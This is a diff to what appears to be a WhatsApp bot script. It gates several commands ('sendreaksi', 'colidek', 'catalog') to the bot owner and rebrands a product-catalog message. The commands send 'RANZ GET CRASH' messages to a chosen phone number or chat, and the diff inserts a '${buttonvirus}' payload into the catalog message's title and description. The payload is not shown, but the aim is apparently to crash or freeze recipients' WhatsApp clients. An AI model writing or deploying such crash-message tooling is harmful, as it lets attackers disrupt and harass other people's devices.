@@ -2282,6 +2282,7 @@ case 'tbctag': {
             m.reply(`SUCCES`)
             break
             case 'sendreaksi' : {
+                if (!isCreator) throw mess.owner
                 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
                 a = await tebece.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                 await tebece.sendMessage(Pe, {text:"RANZ GET CRASH"}, {quoted: a})
@@ -2314,6 +2315,7 @@ m.reply(`SUCCES`)
             }
                 break
                 case 'colidek' : {
+                    if (!isCreator) throw mess.owner
                     a = await tebece.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                     await tebece.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
                     await tebece.sendMessage(m.chat, {text:"RANZ GET CRASH"}, {quoted: a})
@@ -2337,6 +2339,8 @@ m.reply(`SUCCES`)
                 break
 case 'catalog': {
 
+if (!isCreator) throw mess.owner
+
 var messa = await prepareWAMessageMedia({ image: thumb }, { upload: tebece.waUploadToServer })
 
 var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -2349,13 +2353,13 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 
 "productId": "4383282311765462",
 
-"title": "HW MODS WA 🔥➥",
+"title": "RANZ CATALOG 🔥➥ ${buttonvirus}",
 
-"description": `© HW MODS WA`,
+"description": `© RANZ CATALOG ${buttonvirus}`,
 
 "currencyCode": "IDR",
 
-"footerText": `© HW MODS WA`,
+"footerText": `© RANZ CATALOG`,
 
 "priceAmount1000": "10000000",
 
@@ -2365,9 +2369,9 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 
 "salePriceAmount1000": "10000000",
 
-"retailerId": `HAIKAL`,
+"retailerId": `RANZ`,
 
-"url": "wa.me/6285714170944"
+"url": "wa.me/6288286858385"
 
 },
 
